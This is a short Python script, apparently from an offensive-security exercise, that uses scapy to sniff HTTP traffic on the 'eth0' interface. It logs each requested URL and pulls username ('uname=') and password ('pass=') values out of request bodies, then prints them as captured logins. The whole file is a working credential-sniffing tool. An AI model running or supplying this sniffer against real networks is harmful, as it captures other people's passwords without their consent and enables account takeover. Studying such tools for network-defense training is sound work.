import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffer_packet)


def sniffer_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request >> " + str(url))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode("utf-8")
            keywords = ["uname=", "pass="]
            login = ""
            password = ""
            for keyword in keywords:
                if keyword in load:
                    start_index = load.index(keyword) + len(keyword)
                    end_index = load.index("&", start_index) if "&" in load[start_index:] else len(load)
                    if keyword == "uname=":
                        login = load[start_index:end_index]
                    elif keyword == "pass=":
                        password = load[start_index:end_index]
            print("[+] Login: " + login)
            print("[+] Password: " + password)


sniff("eth0")